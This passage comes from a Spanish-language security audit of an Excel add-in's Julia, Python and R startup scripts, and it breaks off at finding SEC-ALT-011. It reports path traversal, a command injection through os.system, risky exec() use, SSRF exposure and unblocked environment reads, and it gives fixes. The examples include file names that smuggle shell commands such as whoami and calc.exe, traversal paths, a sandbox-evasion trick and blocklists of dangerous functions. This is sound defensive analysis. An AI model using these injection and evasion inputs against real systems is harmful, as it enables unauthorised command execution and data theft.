Estos archivos son **código de librería confiable** que se ejecuta FUERA del sandbox. El `SandboxVerifier` (Common/SandboxVerifier.cc) bloquea las siguientes funciones Julia para **código de usuario** enviado via `=NEVEN.j()`:
- `run()`, `pipeline()`, backticks (`` ` ``)
- `eval()`, `Meta.parse()`, `include()`
- `ccall()`, `@ccall`, `cglobal()`
- `rm()`, `mv()`, `cp()`, `mkpath()`
- `download()`, `unsafe_*`

Sin embargo, las funciones de la librería J4XCL (cargadas al inicio) **no pasan por el sandbox** — se ejecutan directamente cuando el usuario las invoca por nombre desde Excel. El flujo es:

```
Excel celda → =NEVEN.j("JC_Archivos", ruta, ...) → ControlJulia.exe
  → evalúa JC_Archivos(ruta, ...) directamente (sin sandbox)
  → readdlm(ruta) / writedlm(ruta) / readdir(ruta)
```

### Conclusión General

Los archivos Julia de la librería J4XCL **no contienen** las funciones más peligrosas (`run`, `eval`, `Meta.parse`) en ningún punto. El riesgo principal se concentra en:
1. **`ReadScriptFile`** en startup.jl que ejecuta `Base.include(Main, path)` con un path recibido de C++ — mitigado porque el path proviene del proceso padre confiable, no directamente del usuario.
2. **`JC_Archivos`** en J4XCL-CN-Conectividad.jl que permite leer/escribir archivos y listar directorios con rutas proporcionadas desde Excel — sin restricción de directorio ni validación de path traversal.
3. **`set_data`** en startup.jl que escribe archivos TSV usando un nombre de dataset que podría contener path traversal.

---

## Hallazgos

---

### [SEC-ALT-006] JC_Archivos permite lectura/escritura de archivos con ruta arbitraria desde Excel

- **Archivo:** libreria/JULIA/J4XCL-CN-Conectividad.jl
- **Líneas:** 60-125 (función JC_Archivos)
- **Contexto:**
```julia
function JC_Archivos(Ruta="", Datos=nothing, Delimitador=",", TipoOutput=0)
    ruta = string(Ruta)

    if TipoOutput == 1
        # Leer CSV
        if !isfile(ruta)
            return "Error: Archivo no encontrado: $ruta"
        end
        data = readdlm(ruta, ',')
        return data

    elseif TipoOutput == 2
        # Escribir CSV
        writedlm(ruta, Datos, ',')
        return "Archivo escrito: $ruta"

    elseif TipoOutput == 5
        # Listar archivos en directorio
        archivos = readdir(ruta)
        return archivos
    end
end
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Acceso a filesystem sin restricción
- **Descripción:** La función `JC_Archivos` es una función de librería que se ejecuta fuera del sandbox. Recibe un parámetro `Ruta` que proviene directamente de una celda de Excel (via el flujo `=NEVEN.j("JC_Archivos", "C:\ruta\archivo.csv", ...)`) y lo usa sin ninguna validación para:
  - **Leer archivos** (`readdlm(ruta, ',')`) — TipoOutput=1,3
  - **Escribir archivos** (`writedlm(ruta, Datos, ',')`) — TipoOutput=2
  - **Listar directorios** (`readdir(ruta)`) — TipoOutput=5
  - **Obtener metadatos** (`stat(ruta)`) — TipoOutput=4

  No hay validación de:
  - Path traversal (`..`, `../../etc/passwd`)
  - Rutas fuera del directorio de trabajo esperado
  - Caracteres especiales en la ruta
  - Permisos o restricción a directorios permitidos

  Un usuario puede leer cualquier archivo accesible por el proceso ControlJulia.exe, escribir archivos en cualquier ubicación con permisos de escritura, y enumerar el contenido de cualquier directorio del sistema.
- **Factor mitigante:** El proceso ControlJulia.exe corre con los mismos permisos que Excel (usuario actual), por lo que no hay escalación de privilegios. El riesgo es de **exfiltración de datos** (leer archivos sensibles del sistema) y **escritura no autorizada** (sobrescribir archivos del usuario).
- **Recomendación:**
  1. Implementar una allowlist de directorios permitidos (ej: directorio del workbook activo, `C:\NEVEN\data\`, directorio temporal).
  2. Validar que la ruta no contiene `..` ni apunta fuera de directorios autorizados.
  3. Considerar usar `realpath()` para canonicalizar la ruta antes de validar.
  4. Limitar la escritura a un directorio de salida específico.
  5. Registrar en log todas las operaciones de filesystem para auditoría.

---

### [SEC-MED-002] ReadScriptFile ejecuta Base.include con path de C++ sin validación de contenido

- **Archivo:** startup/startup.jl
- **Línea:** 17
- **Contexto:**
```julia
function ReadScriptFile(path::String, notify::Bool=false)
    if notify
        println("Loading script file: $path")
    end
    try
        Base.include(Main, path)
        return true
    catch e
        @error "Error loading $path" exception=(e, catch_backtrace())
        return false
    end
end
```
- **Severidad:** Media
- **Categoría:** Seguridad > Ejecución de código dinámico
- **Descripción:** La función `ReadScriptFile` ejecuta `Base.include(Main, path)` que carga y ejecuta un archivo Julia arbitrario en el scope de `Main`. El parámetro `path` proviene del proceso padre C++ (`ControlJulia.exe`) via `ResolveFunction("NEVEN.ReadScriptFile")` (julia_interface.cc:583). El riesgo es **medio** porque:
  - El path no proviene directamente del usuario Excel — es construido por el proceso C++ padre.
  - Sin embargo, si el path se deriva de entrada de usuario (ej: un usuario que especifica un archivo .jl a cargar), el código incluido se ejecuta sin sandbox.
  - `Base.include(Main, path)` ejecuta TODO el código del archivo sin restricciones — incluyendo `run()`, `eval()`, acceso a red, etc.
  - No hay validación de que el archivo está en un directorio confiable.
  - No hay verificación de integridad del archivo (hash, firma).
- **Factor mitigante:** El `SandboxVerifier` en C++ valida el código de usuario ANTES de enviarlo a Julia. `ReadScriptFile` se usa para cargar archivos de librería confiables, no código de usuario directo. El flujo normal es: C++ valida → si es código de usuario, pasa por sandbox → si es archivo de librería, usa `ReadScriptFile`.
- **Recomendación:**
  1. Validar que `path` apunta a un directorio confiable (ej: `C:\NEVEN\libreria\`, `C:\NEVEN\startup\`).
  2. Considerar verificar el hash SHA-256 del archivo contra una lista conocida (ya existe `startup.jl.sha256`).
  3. Rechazar paths con `..` o que apunten fuera de directorios autorizados.

---

### [SEC-MED-003] set_data escribe archivos TSV con nombre de dataset sin validación de path traversal

- **Archivo:** startup/startup.jl
- **Líneas:** 188-210
- **Contexto:**
```julia
function set_data(name::String, data)
    _datasets[name] = data
    _dataset_version[] += 1
    
    try
        dir = get(ENV, "NEVEN_HOME", "C:\\NEVEN")
        mkpath(joinpath(dir, "data"))
        filepath = joinpath(dir, "data", "$(name).tsv")
        open(filepath, "w") do io
            for i in 1:size(data, 1)
                for j in 1:size(data, 2)
                    if j > 1; print(io, "\t"); end
                    print(io, data[i, j])
                end
                println(io)
            end
        end
    catch e
        @warn "set_data: could not write shared file" exception=e
    end
end
```
- **Severidad:** Media
- **Categoría:** Seguridad > Acceso a filesystem sin restricción
- **Descripción:** La función `set_data` construye una ruta de archivo usando `joinpath(dir, "data", "$(name).tsv")` donde `name` es un string que podría provenir de una celda de Excel. Si `name` contiene caracteres de path traversal (ej: `"../../Windows/System32/malicious"` o `"..\\..\\important"`), `joinpath` en Julia **no sanitiza** estos componentes — simplemente los concatena. Esto podría permitir escritura de archivos fuera del directorio `C:\NEVEN\data\`.
- **Factor mitigante:** 
  - `joinpath` en Julia maneja correctamente separadores pero no previene `..`.
  - El archivo se escribe con extensión `.tsv` forzada, limitando el impacto.
  - El contenido es datos tabulares (no código ejecutable).
  - El directorio base es `C:\NEVEN\` que es propiedad del usuario.
- **Recomendación:**
  1. Validar que `name` no contiene `..`, `/`, `\`, ni caracteres especiales.
  2. Usar una allowlist de caracteres para nombres de dataset: `[a-zA-Z0-9_-]`.
  3. Ejemplo: `if occursin(r"[^a-zA-Z0-9_-]", name); error("Invalid dataset name"); end`

---

## Hallazgos Positivos (Fortalezas)

### [FOR-JUL-001] Ausencia total de run(), eval() y Meta.parse() en código de librería Julia

- **Archivo:** libreria/JULIA/ (5 archivos, ~1990 líneas totales)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts
- **Descripción:** Los 5 archivos de la librería J4XCL (`functions.jl`, `J4XCL-CN-Conectividad.jl`, `J4XCL-ML-Aprendizaje.jl`, `J4XCL-MT-Matematicas.jl`, `J4XCL-OP-Optimizacion.jl`) **no contienen ningún uso** de las funciones más peligrosas de Julia: `run()`, `eval()`, `Meta.parse()`, backticks (`` ` ``), `@ccall`, `unsafe_*`, ni `download()`. Todas las funciones son puramente computacionales (álgebra lineal, estadística, optimización, cálculo numérico) y operan exclusivamente sobre datos numéricos recibidos como parámetros.

### [FOR-JUL-002] SandboxVerifier bloquea exhaustivamente funciones peligrosas de Julia para código de usuario

- **Archivo:** Common/SandboxVerifier.cc:116-144
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts
- **Descripción:** El `SandboxVerifier` implementa una blocklist exhaustiva para Julia que cubre: ejecución de shell (`run()`, `pipeline()`, backticks), manipulación de archivos (`rm()`, `mv()`, `cp()`, `mkpath()`), red (`download()`), código nativo (`ccall()`, `@ccall`, `cglobal()`), evaluación dinámica (`eval()`, `Meta.parse()`, `include()`), y operaciones unsafe (`unsafe_load()`, `unsafe_store!`, `unsafe_pointer`). Adicionalmente detecta interpolación de strings combinada con comandos (`$(...)` + `run`). Esto previene que código de usuario enviado via `=NEVEN.j("código")` ejecute operaciones peligrosas.

### [FOR-JUL-003] Funciones de librería son puramente computacionales sin efectos secundarios de sistema

- **Archivo:** libreria/JULIA/J4XCL-MT-Matematicas.jl, J4XCL-ML-Aprendizaje.jl, J4XCL-OP-Optimizacion.jl
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts
- **Descripción:** Las funciones matemáticas (`JM_Algebra`, `JM_Calculo`, `JM_EDO`), de aprendizaje automático (`JML_Clasificacion`, `JML_Clustering`, `JML_Estadistica`) y de optimización (`JO_Optimizar`) operan exclusivamente sobre matrices y vectores numéricos recibidos como parámetros. No acceden al filesystem, red, procesos del sistema, ni variables de entorno. Su único efecto es retornar resultados computados — no tienen efectos secundarios sobre el sistema.

### [FOR-JUL-004] Verificación de integridad de startup.jl via SHA-256

- **Archivo:** startup/startup.jl.sha256
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts
- **Descripción:** El archivo `startup/startup.jl.sha256` contiene el hash SHA-256 del script de inicio, permitiendo verificar que no ha sido modificado. Esto complementa la seguridad de `ReadScriptFile` al proporcionar un mecanismo de detección de tampering del archivo de inicio.

### [FOR-JUL-005] ccall en startup.jl usa punteros internos registrados — no expuestos al usuario

- **Archivo:** startup/startup.jl:103,162
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts
- **Descripción:** Los dos usos de `ccall` en startup.jl (`CallCOMMethod` y el display MIME) usan punteros de callback registrados internamente por el proceso C++ padre via `SetCallbacks()`. Estos punteros no son accesibles ni modificables por código de usuario (el sandbox bloquea `ccall`), y solo se usan para la comunicación legítima entre Julia y el host COM de Excel.

---

## Resumen de Severidades

| Severidad | Cantidad | IDs |
|-----------|----------|-----|
| Crítica | 0 | — |
| Alta | 1 | SEC-ALT-006 |
| Media | 2 | SEC-MED-002, SEC-MED-003 |
| Baja | 0 | — |
| Fortalezas | 5 | FOR-JUL-001 a FOR-JUL-005 |

---

## Nota sobre Alcance

El análisis se limitó a los archivos Julia en `libreria/JULIA/` (5 archivos) y `startup/startup.jl`. Los archivos en `Build/Dist*/` son copias de distribución del mismo código y no se analizaron por separado. El archivo `scripts/build-julia-sysimage.jl` es un script de build que no se ejecuta en producción.

---

---

# Hallazgos de Seguridad — Funciones Peligrosas en Scripts Python

**Tarea:** 3.3 Analizar archivos Python en startup/ en busca de funciones peligrosas  
**Fecha:** 2026-01-XX  
**Alcance:** startup/startup.py (único archivo Python en startup/)  
**LOC:** ~1058 líneas  
**Nota:** Python está DEPRECADO en NEVEN (OFF por defecto en CMake). El archivo startup.py se ejecuta FUERA del sandbox como código de librería confiable.

---

## Resumen del Escaneo

### Funciones peligrosas buscadas

| Función | Ocurrencias | Línea(s) |
|---------|-------------|----------|
| `exec()` | 1 | 191 |
| `eval()` | 0 | — |
| `subprocess.*` | 0 | — |
| `os.system()` | 1 | 359 |
| `os.popen()` | 0 | — |
| `pickle.load` / `pickle.loads` | 0 | — |
| `yaml.load` (sin SafeLoader) | 0 | — |

### Verificaciones adicionales

| Patrón | Ocurrencias | Contexto |
|--------|-------------|----------|
| HTTP requests con URL configurable | 1 | `_http_post()` línea 783 — URL de `neven-config.json` |
| Operaciones de archivo con ruta de usuario | 2 | `read_script_file()` línea 189, `Crea_HTML()` línea 430+ |
| Deserialización insegura | 0 | — |

### Conclusión General

El archivo `startup/startup.py` contiene **2 funciones peligrosas** (`exec()` y `os.system()`) que se ejecutan fuera del sandbox. El `exec()` es inherente al diseño (carga scripts de usuario en el namespace) y su riesgo es mitigado por el SandboxVerifier del lado C++ que filtra el código ANTES de enviarlo a Python. El `os.system()` en `quarto_render()` es un hallazgo de **severidad Crítica** porque construye un comando shell con datos de usuario (ruta de archivo desde celda Excel) sin sanitización de metacaracteres, y esta función NO pasa por el SandboxVerifier ya que es parte del código de librería confiable.

---

## Hallazgos

---

### [SEC-CRI-003] Inyección de comandos en quarto_render() via os.system() con ruta de usuario no sanitizada

- **Archivo:** startup/startup.py
- **Línea:** 359
- **Contexto:**
```python
def quarto_render(file_path, format="html"):
    """Render a Quarto .qmd document. Returns output path or launches render."""
    fmt = str(format).lower().strip()
    if fmt not in ("html", "pdf", "docx"):
        return "ERROR: Use html, pdf, or docx"
    fp = str(file_path).strip()
    if not os.path.isfile(fp):
        return "ERROR: File not found: " + fp
    if not fp.lower().endswith(".qmd"):
        return "ERROR: File must have .qmd extension"
    env_str = "QUARTO_PYTHON=" + sys.executable
    cmd = "set " + env_str + " && quarto render " + '"' + fp + '"' + " --to " + fmt
    work_dir = os.path.dirname(fp) or "."
    # Launch in background using START /B — returns immediately, doesn't block pipe
    full_cmd = 'start /B /D "' + work_dir + '" cmd /C "' + cmd + '"'
    os.system(full_cmd)  # ← PELIGRO: shell injection
```
- **Severidad:** Crítica
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** La función `quarto_render()` es invocable desde Excel como función de librería Python (no pasa por el SandboxVerifier porque es código de startup confiable). Recibe `file_path` directamente del usuario (celda Excel) y lo concatena en un comando shell que se ejecuta via `os.system()`. Las validaciones presentes son insuficientes:
  - `os.path.isfile(fp)` — solo verifica existencia, no previene inyección
  - `.endswith(".qmd")` — un archivo `malicious" & calc.exe & ".qmd` pasaría esta validación si existe
  - No se sanitizan metacaracteres de shell: `"`, `&`, `|`, `^`, `%`, `\n`, `\r`
  
  **Vector de ataque:** Un usuario puede crear un archivo con nombre malicioso (ej: `test" & whoami > C:\exfil.txt & ".qmd`) y luego invocar `quarto_render()` desde Excel. El `os.system()` ejecuta `cmd /C` que interpreta todos los metacaracteres de shell.
  
  **Agravante:** `os.system()` invoca `cmd.exe` como shell intermedio, lo que amplifica la superficie de ataque comparado con `CreateProcessA` (que no invoca shell por defecto). Además, esta función corre en el proceso hijo ControlPython.exe que tiene los mismos privilegios que el usuario de Excel.
  
  **Nota:** El equivalente C++ (`RJ_Q` en basic_functions.cc, hallazgo SEC-CRI-001) tiene el mismo problema pero usa `CreateProcessA` sin shell intermedio. La versión Python es más peligrosa por usar `os.system()` → `cmd.exe`.
- **Recomendación:**
  1. Reemplazar `os.system()` con `subprocess.run()` pasando argumentos como lista (evita interpretación de shell):
     ```python
     import subprocess
     subprocess.run(
         ["quarto", "render", fp, "--to", fmt],
         cwd=work_dir,
         env={**os.environ, "QUARTO_PYTHON": sys.executable},
         creationflags=subprocess.CREATE_NO_WINDOW
     )
     ```
  2. Sanitizar `file_path` bloqueando caracteres de inyección: `"`, `&`, `|`, `^`, `%`, `<`, `>`, `\n`, `\r`, `` ` ``.
  3. Validar que la ruta no contiene secuencias de escape de cmd.exe (`%VAR%`, `^`).
  4. Considerar usar la misma `ValidateInputSecurity()` que implementa `QuartoService` en C++ (aunque incompleta, es mejor que nada).
  5. Dado que Python está deprecado (OFF por defecto), considerar eliminar esta función o marcarla como no disponible.

---

### [SEC-ALT-007] exec() en read_script_file() ejecuta código arbitrario de archivo — mitigado por SandboxVerifier externo

- **Archivo:** startup/startup.py
- **Línea:** 191
- **Contexto:**
```python
def read_script_file(path, notify=False):
    """Executes a Python source file in __main__ namespace."""
    import __main__
    try:
        with open(path, "r", encoding="utf-8") as f:
            source = f.read()
        exec(compile(source, path, "exec"), __main__.__dict__)
        return True
    except FileNotFoundError:
        print(f"Error: file not found: {path}", file=sys.stderr)
        return False
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** La función `read_script_file()` lee un archivo Python desde una ruta proporcionada y ejecuta su contenido completo via `exec()` en el namespace de `__main__`. Esta función es invocada por el proceso C++ padre (ControlPython.exe) para cargar scripts de usuario.
  
  **Mitigación existente:** El SandboxVerifier en C++ (`Common/SandboxVerifier.cc`) analiza el código ANTES de enviarlo a Python y bloquea funciones peligrosas (`os.system`, `subprocess`, `os.popen`, `exec`, `eval`, `__import__`, etc.). Sin embargo:
  - El SandboxVerifier opera sobre el texto del código fuente (análisis léxico), no sobre el comportamiento en runtime
  - Técnicas de ofuscación podrían evadir la detección textual (ej: `getattr(os, 'sys'+'tem')('cmd')`)
  - El `path` no se valida — podría apuntar a cualquier archivo accesible por el proceso
  
  **Riesgo residual:** Si un atacante logra colocar un archivo `.py` malicioso en una ubicación accesible y convence al usuario de cargarlo (o si el SandboxVerifier es evadido), el `exec()` ejecutará código arbitrario con los privilegios del proceso ControlPython.exe.
  
  **Nota:** Este patrón es inherente al diseño del sistema (ejecutar scripts de usuario es la funcionalidad principal). El riesgo se mitiga en la capa C++, no en Python.
- **Recomendación:**
  1. Validar que `path` está dentro de directorios permitidos (directorio de trabajo del usuario, no rutas de sistema).
  2. Verificar que el archivo no excede un tamaño máximo razonable antes de ejecutar.
  3. Considerar agregar un segundo nivel de validación en Python (redundante con SandboxVerifier) para defensa en profundidad.
  4. Documentar explícitamente que la seguridad de `exec()` depende del SandboxVerifier externo.
  5. Dado que Python está deprecado, considerar si esta funcionalidad debe mantenerse activa.

---

### [SEC-MED-004] HTTP POST a endpoint configurable por usuario — riesgo de SSRF limitado

- **Archivo:** startup/startup.py
- **Línea:** 783
- **Contexto:**
```python
def _http_post(url, headers, body, timeout=60):
    """Make an HTTP POST request to the LLM endpoint."""
    # Security: enforce HTTPS for non-localhost endpoints
    if not url.startswith("https://") and "localhost" not in url and "127.0.0.1" not in url:
        return "❌ Error AI: El endpoint debe usar HTTPS para proteger su API key."

    url = url.replace("://localhost:", "://127.0.0.1:").replace("://localhost/", "://127.0.0.1/")
    proxy_handler = urllib.request.ProxyHandler({})
    opener = urllib.request.build_opener(proxy_handler)
    req = urllib.request.Request(url, data=body.encode("utf-8"), headers=headers, method="POST")
    # ...
```
- **Severidad:** Media
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** La función `_http_post()` realiza solicitudes HTTP POST a una URL que proviene del archivo de configuración `neven-config.json` (campo `AI.endpoint`). Aunque no es una función "peligrosa" clásica, presenta un riesgo de SSRF (Server-Side Request Forgery) limitado:
  - Un atacante que modifique `neven-config.json` podría redirigir las solicitudes de AI a un servidor malicioso
  - El endpoint podría apuntar a servicios internos de la red local (ej: `http://192.168.1.1/admin`)
  - La API key del usuario se envía en el header `Authorization` al endpoint configurado
  
  **Mitigaciones existentes:**
  - Validación HTTPS para endpoints no-localhost (línea 775) — previene envío de API key en texto plano a servidores remotos
  - El endpoint se lee de un archivo local (`neven-config.json`) que requiere acceso al filesystem para modificar
  - El proxy del sistema se desactiva explícitamente (línea 781)
  
  **Riesgo residual:** Si un atacante tiene acceso de escritura a `C:\NEVEN\neven-config.json`, puede redirigir las solicitudes AI (incluyendo la API key) a un servidor bajo su control. Sin embargo, un atacante con acceso de escritura al filesystem ya tiene capacidad de ejecución directa.
- **Recomendación:**
  1. Validar que el endpoint no apunta a rangos de IP privados/internos (10.x, 172.16-31.x, 192.168.x) a menos que sea explícitamente localhost.
  2. Considerar una allowlist de dominios conocidos para providers de AI (api.openai.com, localhost, 127.0.0.1).
  3. Verificar integridad del archivo de configuración (hash o firma) antes de leer el endpoint.
  4. Documentar que la API key se envía al endpoint configurado y que el usuario es responsable de verificar la URL.

---

### [SEC-MED-005] Operaciones de archivo con rutas de usuario sin restricción de directorio

- **Archivo:** startup/startup.py
- **Líneas:** 189 (read_script_file), 430+ (Crea_HTML)
- **Contexto:**
```python
# read_script_file — abre cualquier archivo accesible
with open(path, "r", encoding="utf-8") as f:
    source = f.read()

# Crea_HTML — lee archivos .md de cualquier carpeta y escribe HTML
md_files = sorted(glob.glob(os.path.join(folder, "*.md")))
# ...
with open(output_path, "w", encoding="utf-8") as f:
    f.write("\n".join(html))
```
- **Severidad:** Media
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** Varias funciones en startup.py realizan operaciones de lectura/escritura de archivos usando rutas proporcionadas por el usuario sin restricción de directorio:
  - `read_script_file(path)` — lee y ejecuta cualquier archivo `.py` accesible por el proceso
  - `Crea_HTML(folder_path)` — lee todos los `.md` de cualquier carpeta y escribe un `.html` en esa misma carpeta
  
  **Riesgo:** Un usuario podría:
  - Leer archivos fuera de su directorio de trabajo (ej: archivos de configuración del sistema)
  - Escribir archivos HTML en directorios sensibles via `Crea_HTML`
  - Usar path traversal (`..\..\`) para acceder a ubicaciones no previstas
  
  **Mitigación parcial:** El SandboxVerifier bloquea `open(` en código de usuario Python, pero estas funciones son parte del código de librería confiable y no pasan por el sandbox. El usuario las invoca indirectamente via `=NEVEN.p("read_script_file('path')")`.
  
  **Nota:** El riesgo es inherente al diseño — el usuario de Excel ya tiene acceso al filesystem con sus propios permisos. El proceso ControlPython.exe no tiene privilegios elevados.
- **Recomendación:**
  1. Validar que las rutas no contienen secuencias de path traversal (`..`, `..\\`).
  2. Considerar restringir `read_script_file` a directorios específicos (directorio del workbook, `%USERPROFILE%\Documents\NEVEN\`).
  3. Validar que `Crea_HTML` no escribe fuera del directorio de entrada.
  4. Canonicalizar rutas con `os.path.realpath()` antes de operar.

---

## Hallazgos Positivos (Fortalezas)

### [FOR-PY-001] Ausencia de eval(), subprocess, os.popen() y deserialización insegura

- **Archivo:** startup/startup.py (completo)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** El archivo startup.py **no contiene** uso de `eval()`, `subprocess.*`, `os.popen()`, `pickle.load()`, ni `yaml.load()` sin SafeLoader. Las únicas funciones peligrosas presentes son `exec()` (necesaria por diseño) y `os.system()` (en una sola ubicación). Esto indica disciplina en la selección de APIs y conciencia de seguridad en el desarrollo.

### [FOR-PY-002] Validación HTTPS para endpoints remotos de AI

- **Archivo:** startup/startup.py:775
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** La función `_http_post()` implementa validación de protocolo: rechaza endpoints que no usan HTTPS a menos que sean localhost/127.0.0.1. Esto previene el envío accidental de API keys en texto plano a servidores remotos. El mensaje de error es claro y orientado al usuario.

### [FOR-PY-003] Enmascaramiento de API key en logs

- **Archivo:** startup/startup.py:815-830
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** La función `_mask_api_key(key)` enmascara la API key mostrando solo los primeros 4 caracteres (`"sk-****"`), previniendo exposición accidental en logs y mensajes de diagnóstico.

### [FOR-PY-004] Validación de formato en quarto_render() — allowlist de formatos de salida

- **Archivo:** startup/startup.py:343-345
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** El parámetro `format` en `quarto_render()` se valida contra una allowlist estricta (`"html"`, `"pdf"`, `"docx"`). Esto previene inyección de argumentos arbitrarios a través del parámetro de formato, limitando el vector de ataque solo al parámetro `file_path`.

### [FOR-PY-005] Rate limiting y thread safety en solicitudes HTTP de AI

- **Archivo:** startup/startup.py:856-880
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** La función `_rate_limited_post()` implementa un lock de threading y un intervalo mínimo de 1 segundo entre solicitudes. Esto previene abuso accidental de APIs de AI (rate limit exhaustion) y asegura ejecución secuencial segura en escenarios multi-hilo.

### [FOR-PY-006] SandboxVerifier bloquea funciones peligrosas en código de USUARIO Python

- **Archivo:** Common/SandboxVerifier.cc:82-153 (referencia cruzada)
- **Severidad:** N/A (Fortaleza)
- **Categoría:** Seguridad > Funciones peligrosas en scripts Python
- **Descripción:** Aunque startup.py contiene `exec()` y `os.system()`, el código de USUARIO Python (ejecutado via `=NEVEN.p()`) pasa por el SandboxVerifier que bloquea: `exec(`, `eval(`, `os.system(`, `os.popen(`, `subprocess.`, `__import__(`, `open(`, `os.environ[`, `os.putenv(`, `importlib.`, `ctypes.`, `compile(`. Esto significa que un usuario no puede invocar directamente estas funciones peligrosas — solo el código de librería confiable (startup.py) puede hacerlo.

---

## Resumen de Severidades

| Severidad | Cantidad | IDs |
|-----------|----------|-----|
| Crítica | 1 | SEC-CRI-003 |
| Alta | 1 | SEC-ALT-007 |
| Media | 2 | SEC-MED-004, SEC-MED-005 |
| Baja | 0 | — |
| Fortalezas | 6 | FOR-PY-001 a FOR-PY-006 |

---

## Nota sobre Contexto de Ejecución

El archivo `startup/startup.py` se ejecuta en un contexto especial:

1. **Fuera del sandbox:** Es código de librería confiable cargado por ControlPython.exe al iniciar. No pasa por el SandboxVerifier.
2. **Python deprecado:** La integración Python está OFF por defecto en CMake (`ENABLE_PYTHON=OFF`). Este código solo se activa si el usuario habilita explícitamente Python.
3. **Proceso hijo:** Se ejecuta dentro de ControlPython.exe, que es un proceso hijo del XLL con los mismos privilegios del usuario de Excel (no elevados).
4. **Comunicación por pipe:** Recibe comandos del XLL via Named Pipe. El XLL aplica el SandboxVerifier ANTES de enviar código de usuario por el pipe.

El riesgo principal es que las funciones de librería (`quarto_render`, `read_script_file`, `Crea_HTML`) son invocables por el usuario como funciones "confiables" sin pasar por el sandbox, y algunas de ellas (`quarto_render`) construyen comandos shell con datos de usuario sin sanitización adecuada.

---

## Nota sobre Exclusiones

- Los archivos en `Build/Dist*/NEVEN/startup/startup.py` son copias de distribución del mismo código y no se analizaron por separado.
- El directorio `startup/__pycache__/` contiene bytecode compilado y fue excluido.
- No existen otros archivos `.py` en el directorio `startup/`.

---

---

# Hallazgos de Seguridad — Variables de Entorno Sensibles en Startup Scripts

**Tarea:** 3.4 Verificar que Startup_Scripts no exponen variables de entorno sensibles  
**Fecha:** 2026-01-XX  
**Alcance:** startup/startup.r, startup/startup.jl, startup/startup.py  
**Objetivo:** Identificar variables de entorno leídas, establecidas o expuestas que podrían filtrar información sensible (PATH, tokens, credenciales, rutas internas) al código de usuario.

---

## Resumen del Escaneo

### Variables de entorno accedidas por script

| Script | Variable | Operación | Propósito |
|--------|----------|-----------|-----------|
| startup.r | `USERPROFILE` | Lectura (`Sys.getenv`) | Construir ruta de directorio de gráficos |
| startup.jl | `NEVEN_HOME` | Lectura (`get(ENV,...)`) | Resolver directorio home para datos compartidos con Pluto |
| startup.py | `USERPROFILE` | Lectura (`os.environ.get`) | Construir ruta de directorio de gráficos y prompts |
| startup.py | `NEVEN_HOME` | Lectura (`os.environ.get`) | Resolver directorio de configuración |
| startup.py | `RJ2XCL_HOME` | Lectura (`os.environ.get`) | Fallback legacy para directorio de configuración |
| startup.py | `QUARTO_PYTHON` | **Escritura** (`set` en cmd) | Expone `sys.executable` como variable de entorno al subproceso Quarto |

### Variables de entorno NO accedidas

- `PATH` — No se lee ni modifica directamente en ningún startup script.
- `APPDATA`, `LOCALAPPDATA` — No accedidos.
- Tokens/credenciales — No se leen de env vars (la API key se lee del archivo JSON, no de env vars).

### Protección del Sandbox

| Lenguaje | `getenv` bloqueado | `setenv` bloqueado |
|----------|--------------------|--------------------|
| R | ❌ `Sys.getenv()` NO bloqueado | ✅ `Sys.setenv()` bloqueado |
| Julia | ❌ `ENV[]` NO bloqueado | ❌ No verificado explícitamente |
| Python | ✅ `os.environ[` bloqueado | ✅ `os.putenv()` bloqueado |

---

## Hallazgos

---

### [SEC-ALT-010] Startup scripts exponen USERPROFILE al código de usuario R via Sys.getenv() no bloqueado

- **Archivo:** startup/startup.r:12, Common/SandboxVerifier.cc:103
- **Línea:** 12 (startup.r), 103 (SandboxVerifier)
- **Contexto:**
```r
# startup.r:12 — el script de inicio usa Sys.getenv() internamente
temp_dir <- file.path(Sys.getenv("USERPROFILE"), "Documents", "NEVEN", "graphics")
```
```cpp
// SandboxVerifier.cc:103 — solo bloquea Sys.setenv, NO Sys.getenv
{"sys.setenv(", "Sys.setenv() — environment manipulation blocked"},
// Sys.getenv() NO aparece en la lista de funciones bloqueadas
```
- **Severidad:** Alta
- **Categoría:** Seguridad > Variables de entorno sensibles
- **Descripción:** El `SandboxVerifier` bloquea `Sys.setenv()` para prevenir que scripts de usuario modifiquen variables de entorno, pero **no bloquea `Sys.getenv()`**. Esto permite que cualquier código R ejecutado via `=NEVEN.r()` lea variables de entorno del sistema, incluyendo:
  - `USERPROFILE` — revela el nombre de usuario y ruta home del usuario de Windows.
  - `NEVEN_HOME` / `RJ2XCL_HOME` — revela la estructura de instalación.
  - Cualquier variable de entorno del proceso Excel, incluyendo potencialmente tokens de sesión, credenciales de proxy (`HTTP_PROXY` con user:pass), o variables configuradas por otros software.
  
  Un usuario malicioso podría ejecutar `=NEVEN.r("Sys.getenv()")` para obtener un dump completo de todas las variables de entorno del proceso Excel, que hereda las variables del usuario de Windows.
- **Recomendación:**
  1. Agregar `{"sys.getenv(", "Sys.getenv() — environment variable read blocked"}` a la lista `r_blocked` en `SandboxVerifier.cc`.
  2. Alternativamente, implementar una allowlist de variables de entorno que el código de usuario puede leer (solo las necesarias para funcionalidad: `USERPROFILE` para gráficos).
  3. Aplicar el mismo tratamiento a Julia: bloquear lectura directa de `ENV` desde código de usuario.

---

### [SEC-ALT-011] Julia startup expone ENV[] sin restricción del sandbox

